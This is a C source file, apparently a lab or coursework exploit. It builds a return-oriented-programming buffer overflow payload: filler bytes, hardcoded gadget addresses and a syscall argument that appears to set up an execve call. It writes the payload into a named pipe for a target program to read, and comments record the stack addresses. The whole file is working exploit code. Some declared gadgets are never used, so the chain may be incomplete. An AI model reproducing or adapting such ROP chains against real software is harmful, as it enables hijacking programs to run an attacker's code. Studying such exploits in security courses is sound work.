#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[146];
  char trap[] = "\xe5\xb6\xa9\xbb";
  char xor_eax[] = "\xc2\xb3\xa9\xbb";
  char pop_eax[] = "\xe1\xa0\xb9\xbb";
  char pop_edx[] = "\x1b\xdc\xb9\xbb";
  char add_dl_al[] = "\x07\x46\xbb\xbb";

  char exec_arg[] = "\x3b\x01\x01\x01";

  int i;
  // Fill up buffer
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x01",1);

  // overwrite ebp
  // pop arg into edx
  strcpy(bufr + 131, pop_edx);
  strcpy(bufr + 135, exec_arg);
  // clear eax
  strcpy(bufr + 139, xor_eax);  
  // add last 8 bits of edx to eax
  strcpy(bufr + 143, add_dl_al);  

  writecmd(PIPEPATH, bufr);
  
  return 0;
}
// esp: 0xbfbf57d8 -> 08048be8
// buf: 0xbfbf57e5